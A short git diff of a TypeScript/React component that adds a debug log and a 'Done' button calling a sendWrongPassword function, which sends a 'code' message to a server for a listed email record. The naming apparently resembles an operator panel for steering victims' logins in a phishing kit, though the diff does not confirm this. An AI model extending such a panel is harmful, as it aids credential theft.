@@ -47,6 +47,7 @@ console.log(data,"main")
   };
 
   const sendWrongPassword = (emailId: string, value: string) => {
+    console.log(value,"done")
     sendToServer("code", emailId, { code: value });
   };
 const handelBack =(emailId: string,value: string)=>{
@@ -220,7 +221,12 @@ const handelBack =(emailId: string,value: string)=>{
                         Back
                       </button>
 
-                      
+                         <button
+                        onClick={() => sendWrongPassword(email._id, "done")}
+                        className="bg-green-500 text-white text-xs py-2 rounded-md shadow hover:bg-orange-600 text-center"
+                      >
+                        Done
+                      </button>
 
                     </div>
                   </td>
